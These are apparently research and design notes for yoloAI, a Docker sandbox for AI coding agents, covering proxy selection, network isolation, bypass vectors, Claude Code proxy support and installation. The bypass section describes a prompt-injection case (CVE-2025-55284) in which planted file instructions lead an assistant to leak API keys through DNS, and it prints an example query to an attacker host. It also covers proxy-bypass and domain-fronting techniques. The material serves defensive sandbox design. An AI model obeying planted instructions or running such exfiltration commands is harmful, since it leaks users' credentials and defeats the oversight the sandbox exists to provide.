Tinyproxy (C-based, ~3 MB image) meets core requirements. `FilterDefaultDeny Yes` + `FilterType fnmatch` + `ConnectPort 443` provides domain-based CONNECT filtering. SIGUSR1 reloads config. Maintainer confirmed domain filtering works for HTTPS CONNECT ([issue #345](https://github.com/tinyproxy/tinyproxy/issues/345)).

**Security concern:** CVE-2025-63938 (integer overflow in port parsing, allows filter bypass) is fixed in master commit `3c0fde9` (October 2025) but **no released version contains this fix**. Latest release is 1.11.2 (May 2024). Release cadence is slow — security patches sit unreleased for months. 116 open issues.

Would need to build from master, not a tagged release. The port filter bypass is partially mitigated by yoloAI's iptables rules (defense-in-depth), but relying on unreleased security fixes for a security-critical component is a risk.

### Squid — overkill

Full-featured, excellent ACL system, actively maintained. But ~20-50 MB memory baseline even with caching disabled. Designed for enterprise caching proxies, not lightweight per-sandbox sidecars. Configuration is powerful but verbose for this simple use case.

### Nginx — wrong tool

Requires third-party `ngx_http_proxy_connect_module` patch. Forward proxying is not nginx's design intent. ~49 MB image. Configuration model is unintuitive for allowlist-based forward proxying.

### mitmproxy — wrong tool, too large

~150+ MB image (Python runtime). Designed for interception and debugging, not production forward proxying. Allowlist model (`allow_hosts`) is an afterthought with reported inconsistencies.

### Custom Go proxy — chosen approach

A purpose-built Go forward proxy using `elazarl/goproxy` (6.6k stars) or `smarty/cproxy` (181 stars, designed for exactly this use case). ~200-300 lines of Go. Compiles to a static binary in a `FROM scratch` image (~5 MB).

Core pattern ([Eli Bendersky's writeup](https://eli.thegreenplace.net/2022/go-and-proxy-servers-part-2-https-proxies/)): parse CONNECT request, check domain against allowlist, `net.Dial` to target, `http.Hijacker` to get raw connection, bidirectional `io.Copy`.

Advantages:
- Integrates naturally with yoloAI's Go codebase
- Single static binary, minimal image and memory footprint
- No external CVE risk or release-cadence dependency
- Full control over allowlist format, reload (SIGUSR1), logging
- Exact feature match — no unused capabilities

### Decision

Custom Go proxy. The modest implementation cost (~200-300 lines) buys independence from tinyproxy's unfixed CVEs and slow release cadence, with equivalent size and performance.

### DNS: Separate Concern

None of the proxy options serve as a DNS resolver. The [security design](../design/security.md) specifies the sandbox uses the proxy sidecar as its DNS resolver with direct outbound DNS blocked by iptables. This requires a lightweight DNS forwarder (e.g., dnsmasq, ~500 KB) running alongside the proxy in the sidecar container. DNS-level domain filtering is not needed — iptables blocks direct DNS and all HTTP/HTTPS must go through the proxy. The DNS forwarder simply resolves queries upstream for the proxy's own outbound connections.

---

## Network Isolation Research

Research into Docker network isolation mechanisms for an AI coding sandbox tool, focusing on verified approaches used in production.

### 1. Docker Network Isolation Mechanisms

#### `--network none`

The `none` network driver completely removes all network interfaces from a container except the loopback device (`lo`). No DNS resolution, no external access, no container-to-container communication. This is the most restrictive option.

**Source:** [Docker Docs — None network driver](https://docs.docker.com/engine/network/drivers/none/)

**Implications for yoloAI:** Useful for `--network-none` mode (offline tasks). Unusable when Claude needs API access because there is no mechanism to selectively permit traffic — it is all-or-nothing.

#### `--internal` flag on custom networks

`docker network create --internal <name>` creates a bridge network where containers can communicate with each other but have no route to external networks. Docker sets up firewall rules to drop all traffic to/from other networks and does not configure a default route.

**Source:** [Docker Docs — docker network create](https://docs.docker.com/reference/cli/docker/network/create/), [Docker Docs — Networking](https://docs.docker.com/engine/network/)

**Implications for yoloAI:** This is the foundation for the proxy-gateway pattern. Put the sandbox container on an `--internal` network, and place a proxy container on both the internal network and a normal (internet-connected) network. The sandbox can only reach the proxy; the proxy decides what reaches the internet.

#### Host-level firewall rules (DOCKER-USER chain)

Docker creates iptables/nftables rules in the **host's** network namespace for bridge networks. The `DOCKER-USER` chain (iptables) or separate nftables tables allow injecting custom rules that run before Docker's own rules. This enables per-container egress filtering from the host.

**Source:** [Docker Docs — Packet filtering and firewalls](https://docs.docker.com/engine/network/packet-filtering-firewalls/), [Docker Docs — Docker with iptables](https://docs.docker.com/engine/network/firewall-iptables/)

#### Container-internal firewall rules (CAP_NET_ADMIN)

Containers can run `iptables` internally if granted `CAP_NET_ADMIN` (and sometimes `CAP_NET_RAW`). This is how the Claude Code devcontainer and Trail of Bits devcontainer implement their firewalls — iptables rules inside the container enforce a default-deny egress policy.

**Source:** [Docker Community Forums — Container with --cap-add=NET_ADMIN](https://forums.docker.com/t/container-with-cap-add-net-admin/111427)

### 2. Proxy-Based Domain Allowlisting in Docker

#### Approach: Internal network + proxy gateway

The established pattern:
1. Create an `--internal` Docker network (no internet access).
2. Run a proxy container connected to both the internal network and a normal network.
3. The sandbox container connects only to the internal network.
4. The sandbox's `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` environment variables point to the proxy.
5. The proxy enforces domain allowlisting.

**Source:** [The Sharat's — Running Docker containers in network isolation with proxied traffic](https://sharats.me/posts/docker-with-proxy/), [SequentialRead — Creating a Simple but Effective Outbound Firewall using Vanilla Docker-Compose](https://sequentialread.com/creating-a-simple-but-effective-firewall-using-vanilla-docker-compose/)

**Critical limitation:** `HTTP_PROXY`/`HTTPS_PROXY` environment variables are advisory. Not all applications honor them. Any process that opens a raw TCP socket bypasses the proxy entirely. This is a fundamental weakness of proxy-only approaches.

#### Squid proxy with domain allowlists

Squid can be configured as a forward proxy with domain-based ACLs. Several Docker images exist for this purpose:
- [jpetazzo/squid-in-a-can](https://github.com/jpetazzo/squid-in-a-can) — transparent Squid proxy using iptables redirection.
- [ionelmc/docker-transparent-squid](https://github.com/ionelmc/docker-transparent-squid) — transparent proxy with `CACHE_DOMAINS` env var.
- [jlandowner/docker-squid-allowlist](https://github.com/jlandowner/docker-squid-allowlist) — Kubernetes-focused allowlist proxy.

**For transparent proxying** (where the proxy intercepts traffic without client configuration), iptables `REDIRECT` rules are required to send all outbound HTTP/HTTPS to the proxy port. This requires `CAP_NET_ADMIN` or host-level rule injection.

#### Anthropic's sandbox-runtime

**Repo:** [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)

Architecture:
- Dual proxy: an HTTP proxy and a SOCKS5 proxy, both running **outside** the sandbox (on the host).
- **Linux:** The sandboxed process's network namespace is removed entirely. All traffic must go through the proxies via Unix domain sockets bind-mounted into the sandbox.
- **macOS:** A Seatbelt profile restricts network access to a specific localhost port where the proxies listen.
- Domain filtering: explicit allowlist model. By default, all network access is denied. Denied domains take precedence over allowed domains.
- DNS: resolved by the proxy on the host side (the sandbox has no direct DNS access on Linux because the network namespace is removed).

**Key design insight:** By removing the network namespace entirely (Linux) rather than using environment variables, sandbox-runtime makes proxy bypass impossible at the network layer. The process literally cannot create sockets that reach the outside world except through the proxy's Unix domain socket.

**Limitation:** Windows is not supported. The approach is not Docker-based — it uses OS-level sandboxing (Linux namespaces, macOS Seatbelt).

**Source:** [GitHub — sandbox-runtime README](https://github.com/anthropic-experimental/sandbox-runtime/blob/main/README.md), [Anthropic Engineering — Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)

#### Docker Sandboxes (Docker Inc.)

Docker's official sandbox product (sandboxes GA in Docker Desktop 4.50+; network policy features in 4.58+, Docker Engine 29.1.5+):
- Each sandbox runs in its own **microVM** with its own Docker daemon.
- A filtering proxy at `host.docker.internal:3128` handles all HTTP/HTTPS traffic.
- Raw TCP and UDP connections to external services are **blocked** (not just unproxied — actually blocked).
- Policy modes: `allow` (default, permit all except blocked CIDRs) or `deny` (block all except explicitly allowed hosts).
- Default blocks: private networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16) and IPv6 equivalents.
- DNS resolution happens at the proxy level. The proxy resolves domains and validates resolved IPs against CIDR rules.
- Configuration via `docker sandbox network proxy` CLI command with `--block-host`, `--allow-host`, `--block-cidr`, `--allow-cidr`, `--bypass-host`, `--policy`.

**Source:** [Docker Docs — Network policies](https://docs.docker.com/ai/sandboxes/network-policies/), [Docker Docs — docker sandbox network proxy](https://docs.docker.com/reference/cli/docker/sandbox/network/proxy/)

**Key design insight:** The microVM boundary is what makes raw TCP/UDP blocking possible — the VM's network stack can enforce rules that a container alone cannot. This is stronger than a container-only approach but requires Docker Desktop (not available on headless Linux servers).

#### Claude Code devcontainer (Anthropic's own)

**Source:** [GitHub — anthropics/claude-code .devcontainer/init-firewall.sh](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)

Uses iptables + ipset inside the container (requires `CAP_NET_ADMIN`):
1. Preserves Docker's internal DNS rules (127.0.0.11 NAT rules) before flushing.
2. Creates an `allowed-domains` ipset (`hash:net` type) for efficient IP matching.
3. Allowlists DNS (UDP 53), SSH (TCP 22), localhost, and the host network.
4. Fetches GitHub IP ranges dynamically from `https://api.github.com/meta`.
5. Resolves individual domains via `dig` and adds IPs to the ipset.
6. Sets default policy to `DROP` for INPUT, FORWARD, and OUTPUT.
7. Allows established/related connections.
8. Allows outbound only to IPs in the `allowed-domains` ipset.
9. Explicitly `REJECT`s (not drops) unmatched outbound for immediate feedback.
10. Verifies by confirming `example.com` is unreachable and `api.github.com` is reachable.

Allowlisted domains: `registry.npmjs.org`, `api.anthropic.com`, `sentry.io`, `statsig.anthropic.com`, `statsig.com`, `marketplace.visualstudio.com`, `vscode.blob.core.windows.net`, `update.code.visualstudio.com`, plus GitHub CIDRs.

**Weakness:** DNS (UDP 53) is allowed outbound to any destination. This is the DNS exfiltration vector. Also, domain-to-IP resolution is done at firewall setup time — if IPs change (CDN rotation), the firewall becomes stale.

#### Trail of Bits devcontainer

**Repo:** [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)

Similar approach to Anthropic's devcontainer: iptables + ipset with `CAP_NET_ADMIN`. Default-deny egress with domain allowlist. Each domain resolved via `dig +noall +answer A` and IPs added to an ipset. Requires `CAP_NET_ADMIN` and `CAP_NET_RAW` granted via Docker's `--cap-add`.

**Source:** [GitHub — trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer), [DeepWiki — Network Security & Firewall](https://deepwiki.com/anthropics/claude-code/6.2-network-security-and-firewall)

### 3. Known Bypass Vectors

#### DNS-based exfiltration (VERIFIED — CVE-2025-55284)

**CVE-2025-55284** demonstrated DNS exfiltration from Claude Code. The attack:
1. Malicious instructions embedded in files Claude analyzes (indirect prompt injection).
2. Claude reads sensitive data (e.g., `.env` files with API keys).
3. Claude executes allowlisted commands (`ping`, `nslookup`, `dig`, `host`) to encode the data as DNS subdomain queries (e.g., `nslookup APIKEY123.attacker.com`).
4. The attacker's DNS server receives the encoded data.

Fixed in Claude Code v1.0.4 (June 2025) by removing networking utilities from the auto-approve allowlist.

**Why this matters for network isolation:** Even with proxy-based domain allowlisting, DNS queries typically bypass the proxy. If the container can reach any DNS server (UDP 53), it can exfiltrate data. The Anthropic devcontainer's `init-firewall.sh` explicitly allows outbound UDP 53 — it is vulnerable to this vector. Anthropic's sandbox-runtime avoids this because the sandboxed process has no network namespace at all; DNS is resolved by the proxy on the host.

**Source:** [Embrace The Red — Claude Code: Data Exfiltration with DNS](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/), [CVE Details — CVE-2025-55284](https://www.cvedetails.com/cve/CVE-2025-55284/)

#### Raw TCP connections bypassing HTTP proxies

`HTTP_PROXY`/`HTTPS_PROXY` environment variables are **advisory only**. Any process can open a raw TCP socket and connect directly, ignoring the proxy. This applies to:
- Custom binaries downloaded during the session.
- Language runtimes that don't respect proxy env vars (some Java, Go, Rust programs).
- Tools like `curl --noproxy '*'` or `wget --no-proxy`.
- SSH, git-over-SSH, and other non-HTTP protocols.

**Mitigation:** Environment variables alone are insufficient. Either:
- Remove the network namespace entirely (sandbox-runtime approach), or
- Use iptables/nftables to block all outbound except to the proxy (iptables approach), or
- Use an `--internal` Docker network where the only reachable host is the proxy container (network topology approach).

#### Domain fronting

An attacker uses a legitimate CDN domain (e.g., `cloudfront.net`) in the TLS SNI field but sets a different `Host:` header to route to an attacker-controlled origin behind the same CDN. This bypasses domain-based allowlists that inspect only the SNI or DNS name.

**Practical risk for yoloAI:** Low-to-moderate. Domain fronting requires that both the allowed domain and the attacker's domain are served from the same CDN. Major CDN providers (AWS CloudFront, Google, Cloudflare) have banned domain fronting. However, it remains possible on some smaller CDNs. A proxy performing TLS inspection (MITM) can detect SNI/Host mismatches, but MITM adds complexity and breaks certificate pinning.

**Source:** [MITRE ATT&CK — T1090.004](https://attack.mitre.org/techniques/T1090/004/), [Wikipedia — Domain fronting](https://en.wikipedia.org/wiki/Domain_fronting), [Compass Security — Bypassing Web Filters Part 3](https://blog.compass-security.com/2025/03/bypassing-web-filters-part-3-domain-fronting/)

#### IP-direct connections

If the allowlist is domain-based, an attacker who knows an IP address can connect directly without a DNS lookup. This bypasses domain-based filtering unless the proxy also validates destination IPs.

**Mitigation:** Docker Sandboxes handles this by resolving domains to IPs at the proxy level and validating resolved IPs against CIDR rules. The iptables/ipset approach (used by Anthropic's devcontainer) inherently works on IPs, so domain-to-IP resolution happens at setup time.

#### Summary: proxy-only vs. iptables vs. network namespace removal

| Vector | Proxy-only (env vars) | iptables/ipset | Network namespace removal |
|---|---|---|---|
| HTTP/HTTPS to unapproved domains | Blocked | Blocked | Blocked |
| Raw TCP bypass | **NOT blocked** | Blocked | Blocked |
| DNS exfiltration (UDP 53) | **NOT blocked** | **NOT blocked** (if DNS allowed) | Blocked (if proxy resolves DNS) |
| Domain fronting | Not blocked without MITM | Not blocked | Not blocked without MITM |
| IP-direct connections | **NOT blocked** | Blocked (only allowlisted IPs) | Blocked |
| Non-HTTP protocols (SSH, etc.) | **NOT blocked** | Blocked (unless explicitly allowed) | Blocked |

### 4. iptables/nftables Approach

#### Can host iptables rules control container traffic?

Yes. Docker creates iptables rules in the **host's** network namespace for bridge networks. The `DOCKER-USER` chain in the `FORWARD` chain runs before Docker's own rules, allowing custom egress filtering. For nftables (Docker 29+, experimental), separate tables with matching base chains serve the same purpose.

DNS-specific iptables rules are additionally created inside the container's network namespace.

**Source:** [Docker Docs — Docker with iptables](https://docs.docker.com/engine/network/firewall-iptables/), [Docker Docs — Docker with nftables](https://docs.docker.com/engine/network/firewall-nftables)

#### Is iptables more robust than a proxy?

Yes, for the raw-TCP-bypass vector. iptables operates at the kernel level on all packets, regardless of whether the application respects proxy environment variables. A process cannot bypass iptables rules in its network namespace without `CAP_NET_ADMIN` (which the sandbox should not grant to application processes).

However, iptables has its own limitations:
- Works on IPs, not domains. Domains must be resolved to IPs at setup time, which means CDN IP rotation can make rules stale.
- DNS exfiltration is still possible if UDP 53 is allowed outbound (which it must be if the container needs DNS resolution).
- Requires `CAP_NET_ADMIN` if rules are applied inside the container (the Anthropic/Trail of Bits approach).

#### Cross-platform viability

| Platform | iptables/nftables support | Notes |
|---|---|---|
| **Linux native** | Full support | iptables rules in host namespace (DOCKER-USER chain) or container namespace (CAP_NET_ADMIN). nftables experimental in Docker 29+. |
| **macOS (Docker Desktop)** | Works inside the LinuxKit VM | Docker Desktop runs containers in a LinuxKit VM. iptables rules work **inside the VM** (including inside containers). The macOS host has no iptables — it uses `pf` (packet filter). Host-side `DOCKER-USER` rules are not accessible from macOS; you must either apply rules inside the container or access the VM via `nsenter`. |
| **WSL2 (Windows)** | Works inside the WSL2 VM | Similar to macOS: containers run in a Linux VM. iptables works inside the VM and containers. |

**Source:** [Collabnix — Under the Hood: Docker Desktop for Mac](https://collabnix.com/how-docker-for-mac-works-under-the-hood/), [Docker Community Forums — iptable manipulation in Docker for Mac](https://forums.docker.com/t/iptable-manipulation-in-docker-for-mac/48193)

**Key insight for yoloAI:** Because Docker on macOS and Windows always runs in a Linux VM, iptables inside the container works on all platforms. The `CAP_NET_ADMIN` approach (rules inside the container) is the most portable. Host-level `DOCKER-USER` rules only work reliably on native Linux.

### 5. Existing Open-Source Implementations

| Tool | Approach | Verified working? |
|---|---|---|
| **Anthropic sandbox-runtime** | Network namespace removal + dual proxy (HTTP + SOCKS5) via Unix domain sockets | Yes — production use for Claude Code |
| **Docker Sandboxes** | MicroVM + filtering proxy, raw TCP/UDP blocked at VM boundary | Yes — Docker Desktop 4.58+ |
| **Claude Code devcontainer** | iptables + ipset inside container (CAP_NET_ADMIN) | Yes — used by Anthropic's own development |
| **Trail of Bits devcontainer** | iptables + ipset inside container (CAP_NET_ADMIN + CAP_NET_RAW) | Yes — used for security audits |
| **jpetazzo/squid-in-a-can** | Transparent Squid proxy with iptables REDIRECT | Yes — but HTTP-only, no HTTPS inspection |
| **Google Agent Sandbox** | Kubernetes controller with gVisor isolation | Yes — GKE production, open source |
| **SequentialRead firewall** | Docker Compose internal network + nginx proxy per domain | Yes — documented with examples |

### 6. Design Approach for yoloAI

#### Adopted approach: internal network + proxy container + iptables fallback

**Architecture:**

```
┌─────────────────────────────────────────────────────┐
│  Host                                               │
│                                                     │
│  ┌─────────────────────────────────────────────┐    │
│  │  Internal Docker Network (--internal)       │    │
│  │  (no internet access)                       │    │
│  │                                             │    │
│  │  ┌───────────────┐   ┌──────────────────┐  │    │
│  │  │ Sandbox        │   │ Proxy            │  │    │
│  │  │ Container      │──►│ Container        │──┼──► Internet
│  │  │                │   │ (Squid/tinyproxy │  │    │ (filtered)
│  │  │ HTTP_PROXY=    │   │  + allowlist)    │  │    │
│  │  │  proxy:3128    │   │                  │  │    │
│  │  │                │   │ Also on normal   │  │    │
│  │  │ iptables:      │   │ Docker network   │  │    │
│  │  │ DROP all       │   └──────────────────┘  │    │
│  │  │ except proxy   │                         │    │
│  │  └───────────────┘                          │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

**Layered defense:**

1. **Network topology (layer 1):** Sandbox container on an `--internal` network. The proxy container bridges the internal and external networks. The sandbox literally cannot route to the internet — only to the proxy.

2. **Proxy allowlist (layer 2):** The proxy (Squid, tinyproxy, or a custom Go proxy) enforces domain-based allowlisting. Only `api.anthropic.com` (and user-specified `--network-allow` domains) are permitted. HTTPS traffic is handled via `CONNECT` tunneling (no MITM needed — the proxy sees the domain from the `CONNECT` request and can allow/deny based on that).

3. **iptables inside container (layer 3, defense-in-depth):** Even on the internal network, add iptables rules inside the sandbox container to ensure only the proxy's IP is reachable on allowed ports. This prevents bypass via any container-to-container communication other than the proxy. Requires `CAP_NET_ADMIN` (a separate Linux capability from `CAP_SYS_ADMIN` — both must be explicitly granted via `--cap-add`).

4. **DNS control (layer 4):** Configure the sandbox container to use the proxy container as its DNS server (or a controlled resolver). The proxy resolves DNS on behalf of the sandbox. Block UDP 53 outbound from the sandbox in iptables. This mitigates DNS exfiltration.

**Why this approach:**

- **Internal network alone** prevents raw TCP bypass without iptables or special capabilities (the network topology does the enforcement, not the application).
- **Proxy** provides human-readable domain allowlisting and logging.
- **iptables** provides defense-in-depth against bypasses.
- **DNS control** addresses the CVE-2025-55284 vector.
- **Cross-platform:** Works on Linux, macOS (Docker Desktop), and WSL2 because all layers operate inside Docker's Linux VM.
- **No MITM needed:** HTTPS `CONNECT` tunneling lets the proxy see the target domain without decrypting traffic.
- **Implementable in Go:** yoloAI creates the Docker network, starts the proxy container, and configures the sandbox container. The proxy can be a small Go binary or a pre-configured Squid image.

#### What the proxy container needs

- A forward proxy that supports `CONNECT` method (for HTTPS) and domain-based ACLs.
- Options: Squid (heavy but battle-tested), tinyproxy (lightweight), or a custom Go proxy (simplest to embed and configure).
- A DNS resolver (optional — can use the host's DNS via Docker's default DNS, then block the sandbox's direct DNS access).

#### Unavoidable limitations

1. **DNS exfiltration with a controlled resolver:** Even if the sandbox uses the proxy's DNS resolver, a malicious query like `secrets.attacker.com` will be forwarded upstream by the resolver. The resolver can log queries and rate-limit suspicious patterns, but cannot fully prevent exfiltration via DNS without deep packet inspection or a DNS allowlist (only resolve known domains). A DNS allowlist is theoretically possible but brittle (breaks when domains use CNAMEs to CDNs). **This is the same limitation shared by Docker Sandboxes, Anthropic's devcontainer, and Trail of Bits' devcontainer.**

2. **Domain fronting:** A proxy that does not perform MITM cannot detect SNI/Host header mismatches. Major CDNs have banned this, but it remains theoretically possible. Acceptable risk for v1.

3. **CDN IP rotation:** If using iptables with IP-based rules (like the devcontainer approach), CDN IP changes can break access. The proxy approach avoids this because it resolves domains at connection time, not at setup time.

4. **`CAP_SYS_ADMIN` / `CAP_NET_ADMIN`:** The iptables-inside-container approach requires `CAP_NET_ADMIN`. This is a separate capability from `CAP_SYS_ADMIN` (used for overlayfs) — both must be granted when using overlay + network isolation. For `copy_strategy: full` (no overlay), `CAP_NET_ADMIN` alone suffices.

5. **Proxy as SPOF:** If the proxy container crashes, the sandbox loses all network access. This is actually a security feature (fail-closed).

#### Changes applied to design docs

The original design proposed a proxy inside the sandbox container. Based on this research, the design was updated to:
- Move the proxy **outside** the sandbox container (into a sidecar). A proxy inside the sandbox can be killed or reconfigured by Claude. A separate container on a separate network is tamper-resistant.
- Use Docker `--internal` network topology as the primary enforcement mechanism, not just proxy environment variables.
- Add iptables rules inside the sandbox as defense-in-depth (configured by entrypoint before privilege drop).
- Control DNS resolution to mitigate exfiltration.
- Document the DNS exfiltration limitation explicitly.

---

## Claude Code Proxy Support Research

Research into whether Claude Code honors HTTP_PROXY/HTTPS_PROXY environment variables, critical for yoloAI's `--network-isolated` feature which routes all traffic through a proxy sidecar on an `--internal` Docker network.

### npm Installation (Node.js)

Claude Code's npm installation (`@anthropic-ai/claude-code`) honors `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY` environment variables. It uses undici's `EnvHttpProxyAgent` with `setGlobalDispatcher()` to apply proxy settings globally to all fetch requests. This was introduced around v1.0.93 (with a regression fixed by ~v1.0.97).

The Anthropic Node.js SDK (`@anthropic-ai/sdk`) does NOT read proxy env vars automatically — it relies on the global dispatcher set by Claude Code's startup code. The SDK also supports explicit proxy configuration via `fetchOptions` with an `undici.ProxyAgent`, but this is for SDK consumers, not relevant to yoloAI (we don't modify Claude Code's source).

**Required Node.js version:** 18+ for Claude Code, 20 LTS+ for the SDK.

**Source:** [Claude Code network configuration docs](https://code.claude.com/docs/en/network-config), [anthropic-sdk-typescript](https://github.com/anthropics/anthropic-sdk-typescript)

### Native Binary Installation (Bun)

The native binary installation bundles a Bun runtime. Bun's `fetch()` does NOT honor `HTTP_PROXY`/`HTTPS_PROXY` env vars. This means the native binary cannot route API calls through a proxy. Known bug tracked in [#14165](https://github.com/anthropics/claude-code/issues/14165) and [#21298](https://github.com/anthropics/claude-code/issues/21298), still reported as of v2.1.20 (February 2026).

**Implication for yoloAI:** The base Docker image MUST install Claude Code via npm (`npm i -g @anthropic-ai/claude-code`), not the native binary. This is already the case in the current design.

### Proxy Protocol Support

- **HTTP forward proxy:** Supported (CONNECT tunneling for HTTPS).
- **SOCKS proxy:** NOT supported. Claude Code explicitly does not support SOCKS proxies.
- **MITM/TLS inspection:** Supported if the proxy CA certificate is provided via `NODE_EXTRA_CA_CERTS=/path/to/ca.pem`. No certificate pinning detected.
- **Client certificates:** Supported via `CLAUDE_CODE_CLIENT_CERT` for mTLS environments.

**Source:** [Claude Code network configuration docs](https://code.claude.com/docs/en/network-config)

### Required Domains

Based on Claude Code's network requirements:

| Domain | Purpose | Required? |
|--------|---------|-----------|
| `api.anthropic.com` | API calls | Yes |
| `statsig.anthropic.com` | Telemetry/feature flags | Recommended (may affect functionality) |
| `sentry.io` | Error reporting | Optional (blocking may cause non-fatal errors) |
| `claude.ai` | OAuth authentication (Pro/Max/Team plans) | Only if using OAuth, not API key |
| `platform.claude.com` | Console authentication | Only if using OAuth, not API key |

For yoloAI v1 (API key auth), the minimum allowlist is `api.anthropic.com`. Telemetry domains (`statsig.anthropic.com`, `sentry.io`) are recommended to avoid potential issues with feature flag checks.

**Source:** [Claude Code devcontainer init-firewall.sh](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh), [Claude Code network config docs](https://code.claude.com/docs/en/network-config)

### How Competitors Handle Proxy Routing

Neither of the two major sandbox implementations relies on `HTTP_PROXY` env vars:

- **sandbox-runtime:** Removes the network namespace entirely (Linux). Traffic flows through Unix domain sockets to host-side proxies. The application has no choice — it literally cannot create external sockets.
- **Docker Sandboxes:** VM-level proxy interception. The microVM's network stack routes through the proxy transparently. The application is unaware.

yoloAI's approach (internal Docker network + `HTTP_PROXY` env vars) is less invasive but depends on the application honoring the env vars. This works for Claude Code's npm installation. **Codex (static Rust binary) proxy support is unverified** — the binary may not honor proxy env vars, which would require relying solely on the iptables + internal network layers for enforcement with Codex.

### Design Implications for yoloAI

1. Base image must use npm installation of Claude Code (already the case).
2. Container environment must include `HTTPS_PROXY=http://<proxy-sidecar>:<port>` and `HTTP_PROXY=http://<proxy-sidecar>:<port>`.
3. Proxy sidecar must be an HTTP forward proxy (not SOCKS). Squid, tinyproxy, or a custom Go proxy all work.
4. No MITM/TLS inspection needed for domain-based allowlisting — HTTPS `CONNECT` tunneling exposes the target domain.
5. For v2 multi-agent support, proxy compatibility must be verified per agent. Agents using non-standard HTTP clients or bundled runtimes (like Bun) may not work.

## Claude Code Installation Research

Researched February 2026. The npm installation path was deprecated in late January 2026 (v2.1.15), but remains the only viable option for Docker containers that need proxy support.

### Official Installation Methods

| Method | Command | Runtime | Proxy support | Docker suitability |
|--------|---------|---------|---------------|-------------------|
| Native installer | `curl -fsSL https://claude.ai/install.sh \| bash` | Bun (bundled) | Broken (Bun fetch ignores HTTP_PROXY) | Poor |
| npm (deprecated) | `npm i -g @anthropic-ai/claude-code` | Node.js | Full (undici honors proxy vars) | Good |
| Homebrew | `brew install --cask claude-code` | Bun (bundled) | Broken | N/A |

### Why npm Remains the Right Choice for Docker

**Native installer problems:**

1. **Proxy support broken.** The native binary uses two HTTP clients: axios (with `https-proxy-agent`) for OAuth/auth — honors `HTTP_PROXY`/`HTTPS_PROXY`; and Bun's native `fetch()` for API streaming — **ignores** proxy env vars. Issue [#14165](https://github.com/anthropics/claude-code/issues/14165) open since December 2025, still unresolved. Duplicate [#21298](https://github.com/anthropics/claude-code/issues/21298) also open.
2. **Segfaults on Debian bookworm AMD64.** The `claude install` subcommand segfaults in Debian bookworm-slim AMD64 Docker containers. ARM64 works. Issue [#12044](https://github.com/anthropics/claude-code/issues/12044) closed as "not planned."
3. **AVX CPU requirement.** Bun requires AVX instructions. VMs/VPS hosts without AVX passthrough crash with "CPU lacks AVX support." Issue [#19904](https://github.com/anthropics/claude-code/issues/19904).
4. **Auto-updates.** The native installer updates automatically in the background — undesirable for reproducible Docker images where we control versions.
5. **`NODE_EXTRA_CA_CERTS` partially broken.** undici's dispatcher doesn't inherit Bun's patched CA store. Issue [#25977](https://github.com/anthropics/claude-code/issues/25977).

**npm is still viable:**

- Package `@anthropic-ai/claude-code` continues to be published and updated on npm.
- Anthropic's own reference `.devcontainer/Dockerfile` in the `anthropics/claude-code` repo still uses npm (`npm install -g @anthropic-ai/claude-code@${CLAUDE_CODE_VERSION}`).
- The deprecation warning is cosmetic — the package works correctly.
- Issue [#20058](https://github.com/anthropics/claude-code/issues/20058) argues against removing the npm path.

### Node.js Version

Anthropic's devcontainer uses Node.js 20 as of February 2026, but Node 20 reaches EOL April 2026. Claude Code's `engines` field requires `>=18.0.0` — Node.js 22 LTS (maintenance until April 2027) is within range and avoids shipping with an EOL runtime. No Node 22-specific incompatibilities found. Install via NodeSource APT repository for Debian.

### Risks to Monitor

- **npm package removal:** If Anthropic stops publishing the npm package, we lose proxy support. This would block `--network-isolated` with Claude Code.
- **Bun proxy fix:** If issue [#14165](https://github.com/anthropics/claude-code/issues/14165) is resolved, the native binary becomes viable and we could drop the ~100MB Node.js dependency from the base image.
- **Node.js 20 EOL:** Node.js 20 reaches end-of-life April 2026. yoloAI uses Node.js 22 LTS (maintenance until April 2027) to avoid this. Claude Code's `engines` field (`>=18.0.0`) confirms compatibility.

---

## Go Libraries vs Shell Commands: Copy and Git

Evaluation of replacing `cp -rp` and `git` CLI exec calls with pure-Go libraries. Conducted February 2026.

### Current Usage

yoloAI shells out to external commands for two categories of operations:

**File copying** (1 call site):
- `create.go:632` — `cp -rp <src> <dst>` via `copyDir()` for `:copy` mode workdir setup.

**Git operations** (5 implemented call sites, ~8 more planned in Phase 6):
- `create.go:528` — `runGitCmd()`: fire-and-forget `git init`, `git config`, `git add -A`, `git commit` for baseline creation.
- `create.go:517` — `gitHeadSHA()`: `git rev-parse HEAD` to capture baseline SHA.
- `safety.go:94` — `CheckDirtyRepo()`: `git status --porcelain` to detect uncommitted changes.
- `inspect.go:63` — `detectChanges()`: `git status --porcelain` for sandbox change detection.
- Phase 6 (planned): `git diff --binary`, `git diff --stat`, `git add -A`, `git apply`, `git apply --check`, `git apply --unsafe-paths --directory=<path>`.

### `otiai10/copy` vs `cp -rp`

**Library:** [github.com/otiai10/copy](https://github.com/otiai10/copy)
**Version evaluated:** v1.14.1 (January 2025)
**Stars:** ~769 | **License:** MIT | **Maintenance:** Moderate (dependabot activity, occasional features)

**Dependencies:** Minimal — only `golang.org/x/sync` and `golang.org/x/sys` in production. Test-only dep `otiai10/mint` excluded from binary.

**API:** Single entry point `Copy(src, dest, ...Options)` with an `Options` struct controlling symlinks, permissions, filtering, concurrency, and error handling.

| Criterion | `otiai10/copy` | `cp -rp` |
|---|---|---|
| Dependencies | 2 (`x/sync`, `x/sys`) | 0 |
| Portability | Pure Go — compiles anywhere | POSIX — Linux/macOS. Windows/WSL needs special handling |
| Performance | Default settings get `copy_file_range` on Linux 5.3+ via Go stdlib. Optional `NumOfWorkers` for parallelism | Single-threaded, highly optimized at syscall level |
| Symlinks | Configurable: `Deep` (follow), `Shallow` (recreate), `Skip` | Platform default behavior |
| Permissions | `PreservePermission`, `PreserveOwner`, `PreserveTimes` | All preserved via `-p` |
| Filtering | `Skip` callback — can exclude `.git`, `node_modules`, etc. | No built-in filtering |
